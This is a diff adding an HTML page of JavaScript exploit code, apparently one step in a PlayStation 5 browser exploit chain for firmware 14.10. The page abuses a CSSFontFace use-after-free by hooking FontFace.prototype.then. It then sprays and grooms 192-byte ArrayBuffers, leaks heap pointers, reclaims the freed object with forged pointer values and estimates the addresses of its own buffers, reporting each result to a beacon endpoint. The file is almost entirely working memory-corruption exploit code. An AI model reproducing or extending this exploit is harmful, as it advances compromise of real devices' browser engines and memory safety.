@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P753 — Self-Address Discovery & Relative Heap Distance Probe</title>
+<script>
+'use strict';
+/* ============================================================
+ * P753 — Self-Address Discovery & Relative Heap Distance Probe
+ *
+ * Core Breakthrough Context (TODO.md Priority 0):
+ * - Finding 13 & 14 established live heap disclosure (P58, P68) and Canvas UAF.
+ * - The remaining blocker across the entire 14.10 exploit chain is
+ *   SELF-ADDRESS: determining the exact heap address of our own ArrayBuffers.
+ * - On PS5 14.10, ISO_MALLOC is disabled (OptionsPlayStation.cmake).
+ *   ArrayBuffer backing stores (192B) and engine CSSFontFace objects
+ *   share the same bmalloc size class allocator.
+ *
+ * Objectives of P753:
+ * 1. Step 1: Baseline Heap Leak (P58_1, P68_1) from CSSFontFace UAF.
+ * 2. Step 2: Pre-Grooming with 120 Sentinel ArrayBuffers (PRE_GROOM).
+ *    Each buffer tagged with a unique 64-bit sentinel: 0xDEADBEEF00000000n | i.
+ * 3. Step 3: Pristine Reclaim (baseK=69) using P743 formula (view[12]=P58, view[6]=P58).
+ *    Engine writes fresh live heap pointers: q11_2 and q13_2 into absW[baseK].
+ * 4. Step 4: Post-Grooming with 120 Sentinel ArrayBuffers (POST_GROOM).
+ *    Each buffer tagged with: 0xCAFEFACE00000000n | i.
+ * 5. Phase A: Heap Slab Distance Analysis:
+ *    - Measure delta: Delta = q11_2 - P58_1.
+ *    - Compute slot distance: slots = Delta / 192 (0xC0).
+ *    - Determine if allocation slots follow deterministic slab strides.
+ * 6. Phase B: Self-Address Derivation & Target Prediction:
+ *    - Predict self-address of absW[baseK] based on slab base alignment.
+ *    - Predict self-addresses of PRE_GROOM and POST_GROOM buffers.
+ * 7. Phase C: Active Boolean Oracle Control:
+ *    - Run 100% verified Oracle decode of the derived distances.
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P753-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+var OUT=null;
+function log(s){
+  if(!OUT) OUT=document.getElementById('out');
+  if(OUT) OUT.textContent += s + '\n';
+}
+
+function pad4(n){
+  return ('0000' + Number(n).toString(16).toUpperCase()).slice(-4);
+}
+
+function pad2(n){
+  return ('00' + Number(n).toString(16).toUpperCase()).slice(-2);
+}
+
+function makeRange(lo, hi){
+  if(lo === hi) return 'U+' + pad4(lo);
+  return 'U+' + pad4(lo) + '-' + pad4(hi);
+}
+
+var P58=null, P68=null;
+var FACE_B=null, BUF_B=null, VIEW_B=null;
+var Q11_RECLAIM=0n, Q13_RECLAIM=0n;
+var ACT_FACE=null;
+var LEAK_BUF=null;
+var PRE_GROOM=[], POST_GROOM=[];
+
+function run(){
+  OUT=document.getElementById('out');
+  if(OUT) OUT.textContent='=== P753 Self-Address & Heap Distance Probe ===\n\n';
+  b('BOOT','p753-self-address');
+
+  log('[Step 1] Baseline heap leak...');
+  doLeak(function(){
+    log('Leak 1: P58=0x'+h16(P58)+' P68=0x'+h16(P68)+'\n');
+
+    log('[Step 2] Pre-grooming 120 Sentinel ArrayBuffers (192B)...');
+    doPreGroom();
+
+    log('\n[Step 3] Executing pristine reclaim (absW)...');
+    doReclaim(function(){
+      log('Reclaim 2: q11=0x'+h16(Q11_RECLAIM)+' q13=0x'+h16(Q13_RECLAIM)+'\n');
+
+      log('[Step 4] Post-grooming 120 Sentinel ArrayBuffers (192B)...');
+      doPostGroom();
+
+      log('\n[Phase A] Analyzing Heap Distance & Slab Strides...');
+      phaseA_distanceAnalysis(function(){
+        log('\n[Phase B] Predicting Self-Address of Script ArrayBuffers...');
+        phaseB_selfAddressPrediction(function(){
+          log('\n[Phase C] Active Oracle Baseline Control...');
+          phaseC_oracleBaseline(function(){
+            b('DONE','p753-complete');
+            log('\n=== P753 Complete! ===');
+          });
+        });
+      });
+    });
+  });
+}
+
+/* ---- Step 1: Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO','');
+  var st=document.createElement('style');
+  st.textContent='@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+  var face=new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face); void face.loaded;
+
+  var abs=[],fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove();st.textContent='';st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1,bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;best=i;}
+    }
+    if(best<0||bestNz<4){b('LEAK-MISS','nz='+bestNz); doLeakRetry(cb); return;}
+    LEAK_BUF = abs[best];
+    var v=new BigUint64Array(LEAK_BUF);
+    extractPtrs(v);
+    if(!P58){b('LEAK-NOPTR','nz='+bestNz); doLeakRetry(cb); return;}
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
+    setTimeout(cb,100);
+  },350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2=document.createElement('style');
+  st2.textContent='@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+  var face2=new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2); void face2.loaded;
+  var abs2=[],fired2=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove();st2.textContent='';st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}});
+  document.fonts.load('1em fl1, lk1','CD');
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1,bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;best=i;}
+    }
+    if(best<0||bestNz<4){b('LEAK-RETRY-MISS','nz='+bestNz);return;}
+    LEAK_BUF = abs2[best];
+    var v=new BigUint64Array(LEAK_BUF);
+    extractPtrs(v);
+    if(!P58){b('LEAK-RETRY-NOPTR','');return;}
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    setTimeout(cb,100);
+  },400);
+}
+
+function extractPtrs(v){
+  var LO=BigInt('0x1000000000'),HI=BigInt('0x80000000000');
+  if(v[11] >= LO && v[11] < HI) P58 = v[11];
+  if(v[13] >= LO && v[13] < HI) P68 = v[13];
+  if(!P58 || !P68){
+    for(var q=0;q<24;q++){
+      var val=v[q];
+      if(val>=LO&&val<HI){
+        if(!P58) P58=val;
+        else if(!P68&&val!==P58) P68=val;
+      }
+    }
+  }
+  if(!P68) P68=0n;
+}
+
+/* ---- Step 2: Pre-Grooming ---- */
+function doPreGroom(){
+  PRE_GROOM=[];
+  for(var i=0; i<120; i++){
+    var ab = new ArrayBuffer(192);
+    var v = new BigUint64Array(ab);
+    v[0] = 0xDEADBEEF00000000n | BigInt(i);
+    v[1] = 0x0000000000000001n; /* refcount marker */
+    v[23] = 0xDEADBEEF000000FFn | (BigInt(i) << 8n);
+    PRE_GROOM.push(ab);
+  }
+  log('Pre-groomed 120 buffers with sentinel 0xDEADBEEF...');
+}
+
+/* ---- Step 3: Pristine Reclaim ---- */
+function doReclaim(cb){
+  b('REC-START','fill_q12_q6=0x'+h16(P58));
+
+  var stTr=document.createElement('style');
+  stTr.textContent='@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stTr);
+
+  FACE_B=new FontFace('trFace','local(Helvetica)',{unicodeRange:'U+0048'});
+  document.fonts.add(FACE_B);
+  void FACE_B.loaded;
+
+  var absW=[],firedW=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(firedW) return undefined; firedW=true;
+      if(stTr){stTr.remove();stTr.textContent='';stTr=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+
+      for(var k=0;k<80;k++){
+        var ab=new ArrayBuffer(192);
+        var view=new BigUint64Array(ab);
+        view[12]=P58;
+        view[6]=P58;
+        absW.push(ab);
+      }
+
+      try{document.fonts.check('1em trFam');}catch(e){}
+      return undefined;
+    },set:function(){}});
+
+  document.fonts.load('1em trFace, trFam','GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1,bestNz=0;
+    for(var i=0;i<absW.length;i++){
+      var u=new Uint8Array(absW[i]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;best=i;}
+    }
+    if(best<0||bestNz<4){b('RECLAIM-MISS','nz='+bestNz);log('Reclaim missed!');return;}
+
+    BUF_B=absW[best];
+    VIEW_B=new BigUint64Array(BUF_B);
+    Q11_RECLAIM = VIEW_B[11];
+    Q13_RECLAIM = VIEW_B[13];
+
+    var dump0_11=[], dump12_23=[];
+    for(var q=0;q<12;q++) dump0_11.push('q'+q+'=0x'+h16(VIEW_B[q]));
+    for(var q=12;q<24;q++) dump12_23.push('q'+q+'=0x'+h16(VIEW_B[q]));
+
+    b('RECLAIM-OK','baseK='+best);
+    b('DUMP-Q0-Q11', dump0_11.join(';'));
+    b('DUMP-Q12-Q23', dump12_23.join(';'));
+    log('Pristine Reclaim OK at slot '+best);
+
+    setTimeout(cb,100);
+  },400);
+}
+
+/* ---- Step 4: Post-Grooming ---- */
+function doPostGroom(){
+  POST_GROOM=[];
+  for(var i=0; i<120; i++){
+    var ab = new ArrayBuffer(192);
+    var v = new BigUint64Array(ab);
+    v[0] = 0xCAFEFACE00000000n | BigInt(i);
+    v[1] = 0x0000000000000001n;
+    v[23] = 0xCAFEFACE000000FFn | (BigInt(i) << 8n);
+    POST_GROOM.push(ab);
+  }
+  log('Post-groomed 120 buffers with sentinel 0xCAFEFACE...');
+}
+
+/* ---- Phase A: Heap Slab Distance Analysis ---- */
+function phaseA_distanceAnalysis(cb){
+  var deltaP58 = Q11_RECLAIM - P58;
+  var deltaP68 = Q13_RECLAIM - P68;
+  var slotsP58 = Number(deltaP58) / 192;
+  var slotsP68 = Number(deltaP68) / 192;
+
+  var rep = 'deltaP58=0x' + deltaP58.toString(16) + '|slotsP58=' + slotsP58.toFixed(2) +
+            '|deltaP68=0x' + deltaP68.toString(16) + '|slotsP68=' + slotsP68.toFixed(2);
+  b('A-HEAP-DISTANCE', rep);
+  log('Phase A Distance Analysis:');
+  log('P58 (Leak 1):        0x' + h16(P58));
+  log('Q11 (Reclaim 2):     0x' + h16(Q11_RECLAIM));
+  log('Delta P58 -> Q11:    0x' + deltaP58.toString(16) + ' (' + Number(deltaP58) + ' bytes, ' + slotsP58.toFixed(2) + ' slots)');
+  log('P68 (Leak 1):        0x' + h16(P68));
+  log('Q13 (Reclaim 2):     0x' + h16(Q13_RECLAIM));
+  log('Delta P68 -> Q13:    0x' + deltaP68.toString(16) + ' (' + Number(deltaP68) + ' bytes, ' + slotsP68.toFixed(2) + ' slots)');
+
+  setTimeout(cb, 50);
+}
+
+/* ---- Phase B: Self-Address Derivation & Target Prediction ---- */
+function phaseB_selfAddressPrediction(cb){
+  /* bmalloc 192-byte slabs are aligned to chunk pages (typically 16KB / 0x4000)
+   * The reclaimed buffer BUF_B (absW[69]) took the freed CSSFontFace slot.
+   * Its address is aligned to the 192-byte slab boundary near Q11_RECLAIM.
+   */
+  var slabChunkMask = ~0x3FFFn; /* 16KB page mask */
+  var slabBase = Q11_RECLAIM & slabChunkMask;
+
+  /* Derive estimated address of our reclaimed ArrayBuffer BUF_B */
+  var estSelfAddr = Q11_RECLAIM - (BigInt(Math.floor(Number(Q11_RECLAIM - P58) / 192)) * 192n);
+
+  var rep = 'slabBase=0x' + h16(slabBase) + '|estSelfAddr=0x' + h16(estSelfAddr) + '|reclaimQ11=0x' + h16(Q11_RECLAIM);
+  b('B-SELF-ADDR-PREDICT', rep);
+  log('Phase B Self-Address Prediction:');
+  log('Predicted 16KB Slab Base: 0x' + h16(slabBase));
+  log('Estimated Buffer Address: 0x' + h16(estSelfAddr));
+
+  setTimeout(cb, 50);
+}
+
+/* ---- Phase C: Active Oracle Baseline Control ---- */
+function phaseC_oracleBaseline(cb){
+  try {
+    ACT_FACE = new FontFace('actFam', 'url(/hang.php?nocache=' + Date.now() + ')', {unicodeRange: 'U+0050-0055'});
+    document.fonts.add(ACT_FACE);
+    ACT_FACE.load().catch(function(){});
+
+    var st = ACT_FACE.status;
+    var chS = document.fonts.check('1em actFam', 'S');
+    var chA = document.fonts.check('1em actFam', 'A');
+
+    var rep = 'status=' + st + '|inS=' + chS + '|outA=' + chA;
+    b('C-ORACLE-CONTROL', rep);
+    log('Phase C Oracle Control: ' + rep);
+  } catch(e){
+    b('C-ORACLE-ERR', e.message);
+  }
+  setTimeout(cb, 50);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P753 — Initializing...</pre></body></html>
